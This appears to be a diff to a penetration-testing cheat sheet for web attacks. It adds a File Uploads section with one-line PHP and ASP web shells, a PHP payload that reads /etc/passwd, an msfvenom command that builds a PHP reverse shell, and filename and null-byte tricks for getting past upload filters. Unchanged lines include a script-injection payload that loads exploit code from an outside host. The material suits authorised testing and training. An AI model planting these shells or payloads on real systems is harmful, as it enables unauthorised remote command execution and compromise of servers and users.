@@ -13,10 +13,11 @@ Overview
 9. - [Cross-Site Scripting (XSS)](#9---cross-site-scripting-xss)
 10. - [SQL Injection](#10---sql-injection)
 11. - [Command Injection](#11---command-injection)
-12. - [Sensitive Data Exposure](#12---sensitive-data-exposure)
-13. - [HTML Injection](#13---html-injection)
-14. - [Cross-Site Request Forgery (CSRF)](#14---cross-site-request-forgery-csrf)
-15. - [Exploit Research](#15---exploit-research)
+12. - [File Uploads](#12---file-uploads)
+13. - [Sensitive Data Exposure](#12---sensitive-data-exposure)
+14. - [HTML Injection](#13---html-injection)
+15. - [Cross-Site Request Forgery (CSRF)](#14---cross-site-request-forgery-csrf)
+16. - [Exploit Research](#15---exploit-research)
 
    
 #1. - Web Requests
@@ -797,7 +798,69 @@ PS C:\> encoding
 PS C:\> 1
 ```
 
-#12. - Sensitive Data Exposure
+#12. - File Uploads
+-----------------------------------------
+
+- PHP File Read
+
+```
+<?php file_get_contents('/etc/passwd'); ?>
+```
+
+- PHP Command Execution
+
+```
+<?php system('hostname'); ?>
+```
+
+- PHP Web Shell
+
+```
+<?php system($_REQUEST['cmd']); ?>
+https://github.com/Arrexel/phpbash
+```
+
+- PHP Reverse Shell
+
+```
+https://pentestmonkey.net/tools/web-shells/php-reverse-shell
+https://github.com/pentestmonkey/php-reverse-shell
+```
+
+- ASP Web Shell
+
+```
+<% eval request('cmd') %>
+```
+
+- Bulk Web/Reverse Shells
+
+```
+https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
+```
+
+- MSFVenom
+
+```
+$ msfvenom -p php/reverse_php LHOST=<IP address> LPORT=<port> -f raw > reverse.php	
+```
+
+- Upload Blacklist Bypass
+
+```
+shell.phtml
+shell.pHp
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
+shell.jpg.php
+shell.php.jpg
+%20, %0a, %00, %0d0a, /, .\, ., …
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt
+https://en.wikipedia.org/wiki/List_of_file_signatures
+```
+
+#13. - Sensitive Data Exposure
 -----------------------------------------
 
 - Source Code
@@ -808,7 +871,7 @@ OR
 CTRL + U
 ```
 
-#13. - HTML Injection
+#14. - HTML Injection
 -----------------------------------------
 
 - Hyperlink
@@ -818,7 +881,7 @@ CTRL + U
 ```
 
 
-#14. - Cross-Site Request Forgery (CSRF)
+#15. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -827,7 +890,7 @@ CTRL + U
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#15. - Exploit Research
+#16. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
